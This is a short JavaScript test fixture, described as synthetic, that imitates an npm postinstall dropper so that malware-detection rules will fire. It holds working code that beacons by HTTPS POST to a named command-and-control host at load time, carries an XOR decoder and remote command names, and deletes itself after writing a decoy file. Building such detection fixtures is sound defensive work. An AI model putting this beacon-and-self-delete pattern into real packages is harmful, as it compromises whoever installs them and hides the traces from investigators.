// Synthetic test fixture mimicking the Axios npm 2026-03 setup.js dropper.
// This file MUST trigger:
//   1. ioc_string_match (multiple campaign:axios-2026-03 hits)
//   2. anti_forensic_xor_autodelete (XOR loop + writeFile package.md + unlink __filename)
//   3. lifecycle_script (postinstall in package.json)
//   4. axios_family compound (above 3 combined)

const fs = require('fs');
const https = require('https');

const XOR_KEY = "OrDeR_7077";
const C2_HOST = "sfrclak.com";
const COMMANDS = ["rsp_peinject", "rsp_runscript", "rsp_kill", "rsp_rundir"];

function decode(buf) {
  const out = Buffer.alloc(buf.length);
  for (let i = 0; i < buf.length; i++) {
    out[i] = buf[i] ^ XOR_KEY.charCodeAt(i % XOR_KEY.length);
  }
  return out;
}

function beacon() {
  const path = "packages.npm.org/product0";
  const req = https.request({
    host: C2_HOST,
    port: 8000,
    path: '/' + '6202033',
    method: 'POST',
    headers: { 'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)' }
  });
  req.end();
}

beacon();

// Anti-forensic cleanup: replace package.json with a decoy + delete this file.
fs.writeFileSync("package.md", "# Documentation moved\n");
fs.unlinkSync(__filename);

module.exports = { decode, COMMANDS };
